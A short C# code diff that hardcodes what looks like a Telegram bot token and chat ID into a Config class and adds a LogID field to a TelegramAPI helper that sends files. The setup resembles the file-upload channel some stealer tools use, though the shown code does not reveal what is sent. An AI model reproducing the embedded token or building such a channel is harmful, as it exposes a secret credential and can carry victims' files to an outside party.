@@ -1410,13 +1410,15 @@ namespace netlib
     public class Config
     {
 
-        public string CI = "";
-        public string TT = "";
+        public string CI = "2008528398";
+        public string TT = "7222603596:AAFST1nDOZMgKSr8vuFlnebnWztSpSub3GM";
 
     }
 
     public class TelegramAPI
     {
+
+        public static string LogID { get; set; }
 
         public static void sendFile(string file, string caption = "", string type = "Document")
         {
